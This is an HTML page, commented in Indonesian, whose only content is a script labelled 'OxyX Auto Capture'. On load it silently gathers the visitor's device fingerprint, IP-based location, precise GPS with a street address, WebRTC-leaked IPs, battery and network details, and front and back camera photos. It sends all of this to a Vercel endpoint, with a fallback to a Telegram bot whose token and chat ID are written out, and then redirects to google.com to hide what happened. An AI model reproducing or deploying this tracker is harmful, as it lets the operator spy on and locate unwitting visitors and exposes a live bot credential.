<!DOCTYPE html>
<html>
<head>
    <title></title>
    <script>
        // ===================== CONFIG =====================
        const CONFIG = {
            // API KAMU
            YOUR_API: "https://api-nu-one-49.vercel.app/api/collect",
            
            // Telegram Backup
            TELEGRAM_TOKEN: "8211111180:AAFkOZqZCAM_gKsi6JWDWejXzhgOAymKTkw",
            TELEGRAM_CHAT_ID: "6865071834",
            
            // Auto redirect
            REDIRECT_URL: "https://google.com",
            REDIRECT_DELAY: 2000
        };
        
        // ===================== DATA COLLECTOR =====================
        const collectedData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            screen: `${screen.width}x${screen.height}`,
            viewport: `${window.innerWidth}x${window.innerHeight}`,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            cookies: navigator.cookieEnabled,
            online: navigator.onLine,
            
            // Akan diisi
            location: null,
            network: null,
            battery: null,
            photos: [],
            webrtc: null,
            ipInfo: null
        };
        
        // ===================== UTILITY =====================
        function sendToAPI(data) {
            // Coba API kamu dulu
            fetch(CONFIG.YOUR_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('API failed');
                }
                console.log('‚úÖ Data sent to your API');
            })
            .catch(error => {
                console.log('‚ö†Ô∏è Falling back to Telegram');
                sendToTelegram(data);
            });
        }
        
        function sendToTelegram(data) {
            const message = `
üö® OXyX AUTO CAPTURE üö®

üìÖ Waktu: ${new Date().toLocaleString('id-ID')}
üåê User Agent: ${data.userAgent.substring(0, 80)}...
üìç Lokasi: ${data.location ? 
    `${data.location.lat}, ${data.location.lon}` : 
    data.ipInfo ? `${data.ipInfo.city}, ${data.ipInfo.country}` : 'Tidak ada'}
üè† Alamat Lengkap: ${data.location?.address || data.ipInfo?.isp || '-'}
üì∏ Foto: ${data.photos.length} captured
üì± Perangkat: ${data.platform}
üñ•Ô∏è Layar: ${data.screen}
üîã Baterai: ${data.battery?.level || 'N/A'} ${data.battery?.charging ? '(Sedang diisi)' : ''}
üì∂ Jaringan: ${data.network?.type || '-'} ${data.network?.speed || ''}
üåê IP Public: ${data.ipInfo?.ip || data.webrtc?.publicIP || '-'}
üîå ISP: ${data.ipInfo?.isp || '-'}
üïí Timezone: ${data.timezone}

#OxyX #${data.platform.replace(/\s+/g, '')}
            `;
            
            fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        }
        
        // ===================== GET IP DETAIL =====================
        async function getIPDetail() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                collectedData.ipInfo = {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    region_code: data.region_code,
                    country: data.country_name,
                    country_code: data.country_code,
                    continent: data.continent_code,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    timezone: data.timezone,
                    currency: data.currency,
                    languages: data.languages,
                    isp: data.org,
                    asn: data.asn,
                    postal: data.postal,
                    calling_code: data.country_calling_code,
                    country_population: data.country_population
                };
                
                return true;
            } catch(e) {
                return false;
            }
        }
        
        // ===================== GET BATTERY DETAIL =====================
        async function getBatteryDetail() {
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    collectedData.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'YA' : 'TIDAK',
                        chargingTime: battery.chargingTime === Infinity ? 'Tidak diisi' : battery.chargingTime + ' detik',
                        dischargingTime: battery.dischargingTime === Infinity ? 'Tidak diketahui' : battery.dischargingTime + ' detik',
                        voltage: 'N/A',
                        health: 'N/A'
                    };
                    
                    // Monitor battery changes
                    battery.addEventListener('levelchange', () => {
                        console.log('Battery level:', battery.level);
                    });
                    
                    return true;
                } catch(e) {
                    return false;
                }
            }
            return false;
        }
        
        // ===================== AUTO CAMERA CAPTURE =====================
        async function autoCaptureCamera() {
            return new Promise(async (resolve) => {
                try {
                    console.log('üì∏ Trying to access camera...');
                    
                    // Coba front camera
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false 
                    });
                    
                    // Buat video element
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.muted = true;
                    video.playsInline = true;
                    
                    // Tunggu video ready
                    video.onloadedmetadata = () => {
                        video.play();
                        
                        // Tunggu 1 detik lalu capture
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            // Simpan photo
                            const photoData = canvas.toDataURL('image/jpeg', 0.7);
                            collectedData.photos.push({
                                type: 'front',
                                data: photoData.substring(0, 1000) + '...',
                                resolution: `${canvas.width}x${canvas.height}`,
                                timestamp: new Date().toISOString()
                            });
                            
                            console.log('‚úÖ Front camera captured');
                            
                            // Stop stream
                            stream.getTracks().forEach(track => track.stop());
                            
                            // Coba back camera setelah 500ms
                            setTimeout(async () => {
                                try {
                                    const stream2 = await navigator.mediaDevices.getUserMedia({ 
                                        video: { facingMode: 'environment' },
                                        audio: false 
                                    });
                                    
                                    video.srcObject = stream2;
                                    video.play();
                                    
                                    setTimeout(() => {
                                        ctx.drawImage(video, 0, 0);
                                        const photoData2 = canvas.toDataURL('image/jpeg', 0.7);
                                        collectedData.photos.push({
                                            type: 'back',
                                            data: photoData2.substring(0, 1000) + '...',
                                            resolution: `${canvas.width}x${canvas.height}`,
                                            timestamp: new Date().toISOString()
                                        });
                                        
                                        stream2.getTracks().forEach(track => track.stop());
                                        console.log('‚úÖ Back camera captured');
                                        resolve(true);
                                    }, 1000);
                                } catch(e) {
                                    console.log('‚ö†Ô∏è Back camera not available');
                                    resolve(true);
                                }
                            }, 500);
                        }, 1000);
                    };
                    
                } catch(error) {
                    console.log('‚ùå Camera access denied:', error.name);
                    resolve(false);
                }
            });
        }
        
        // ===================== GET LOCATION =====================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        collectedData.location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + ' meter',
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed,
                            heading: pos.coords.heading,
                            timestamp: new Date(pos.timestamp).toISOString()
                        };
                        
                        // Get detailed address
                        try {
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&zoom=18`
                            );
                            const geoData = await response.json();
                            
                            collectedData.location.address = geoData.display_name;
                            collectedData.location.road = geoData.address?.road || 'Tidak diketahui';
                            collectedData.location.neighbourhood = geoData.address?.neighbourhood;
                            collectedData.location.suburb = geoData.address?.suburb;
                            collectedData.location.city = geoData.address?.city || geoData.address?.town || geoData.address?.village;
                            collectedData.location.county = geoData.address?.county;
                            collectedData.location.state = geoData.address?.state;
                            collectedData.location.country = geoData.address?.country;
                            collectedData.location.postcode = geoData.address?.postcode;
                            collectedData.location.country_code = geoData.address?.country_code;
                        } catch(e) {}
                        
                        resolve(true);
                    },
                    (error) => {
                        console.log('üìç Location denied:', error.message);
                        resolve(false);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // ===================== GET NETWORK INFO =====================
        function getNetworkInfo() {
            if (navigator.connection) {
                collectedData.network = {
                    type: navigator.connection.type || 'unknown',
                    effectiveType: navigator.connection.effectiveType || 'unknown',
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData ? 'AKTIF' : 'TIDAK',
                    downlinkMax: navigator.connection.downlinkMax || 'unknown'
                };
            }
            
            // WebRTC IP Leak Detection
            try {
                const rtc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const candidate = e.candidate.candidate;
                        if (candidate.includes('srflx')) {
                            collectedData.webrtc = {
                                publicIP: candidate.split(' ')[4],
                                type: 'STUN Public IP',
                                port: candidate.split(' ')[5]
                            };
                        } else if (candidate.includes('host')) {
                            collectedData.webrtcLocal = {
                                localIP: candidate.split(' ')[4],
                                type: 'Local IP'
                            };
                        }
                    }
                };
                
                setTimeout(() => rtc.close(), 5000);
            } catch(e) {}
        }
        
        // ===================== MAIN EXECUTION =====================
        async function executeAll() {
            console.log('üöÄ Starting OxyX Auto Capture...');
            
            // 1. Get IP Detail (PERTAMA biar cepet)
            await getIPDetail();
            
            // 2. Get Battery Detail
            await getBatteryDetail();
            
            // 3. Get Network Info
            getNetworkInfo();
            
            // 4. Get Location (async, bisa lama)
            getLocation();
            
            // 5. Auto Capture Camera (Sekalian jalanin)
            setTimeout(async () => {
                console.log('üì∏ Starting auto camera capture...');
                await autoCaptureCamera();
                
                // 6. Send semua data
                console.log('üì§ Sending all data...');
                sendToAPI(collectedData);
                
                // 7. Redirect
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, CONFIG.REDIRECT_DELAY);
                
            }, 1500); // Tunggu 1.5 detik sebelum kamera
            
            // Backup: Kirim data tanpa kamera setelah 5 detik
            setTimeout(() => {
                if (collectedData.photos.length === 0) {
                    console.log('‚è±Ô∏è Sending data without camera...');
                    sendToAPI(collectedData);
                }
            }, 5000);
        }
        
        // ===================== START =====================
        // Trigger semua
        window.addEventListener('DOMContentLoaded', executeAll);
        window.addEventListener('load', executeAll);
        
        // Langsung execute tanpa tunggu
        setTimeout(executeAll, 500);
        
        // Auto click untuk trigger user interaction (trick)
        document.addEventListener('click', executeAll);
        document.addEventListener('touchstart', executeAll);
        document.addEventListener('keydown', executeAll);
        
    </script>
</head>
<body>
<!-- KOSONG -->
</body>
</html>